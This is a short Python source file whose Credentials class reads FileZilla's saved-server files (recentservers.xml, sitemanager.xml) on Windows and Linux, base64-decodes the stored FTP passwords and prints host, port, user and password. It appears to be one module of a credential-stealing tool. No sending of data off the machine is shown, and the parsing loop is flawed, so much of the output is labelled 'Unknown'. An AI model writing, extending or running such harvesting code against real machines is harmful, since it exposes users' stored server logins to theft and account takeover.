import os, xml.etree.ElementTree as ET
from base64 import b64decode
from src.utils import *

class Credentials():
    def __init__(self):
        self.appdata = os.getenv('APPDATA')
        self.home = os.path.expanduser('~')

    def filezilla(self):
        if os.name == 'nt':
            recentservers = os.path.join(self.appdata, 'FileZilla', 'recentservers.xml')
            sitemanager = os.path.join(self.appdata, 'FileZilla', 'sitemanager.xml')
        else:
            recentservers = os.path.join(self.home, '.config', 'filezilla', 'recentservers.xml')
            sitemanager = os.path.join(self.home, '.config', 'filezilla', 'sitemanager.xml')

        def parse(file):
            tree = ET.parse(file)
            root = tree.getroot()

            final = {}
            for item in root:

                visits_element = item.find("*")
                for dat in visits_element.iter("*"):                

                    key = Utils().randstr(5)

                    temp = {key: {}}
                    temp[key].update({
                        'Host': dat.text if dat.tag == 'Host' else 'Unknown',
                        'Port': dat.text if dat.tag == 'Port' else 'Unknown',
                        'User': dat.text if dat.tag == 'User' else 'Unknown',
                        'Pass': b64decode(dat.text.encode()).decode() if dat.tag == 'Pass' else 'Unknown'
                    })

                    print(temp)

                    final.update(temp[key])

            return final

        return parse(recentservers)
    

print(Credentials().filezilla())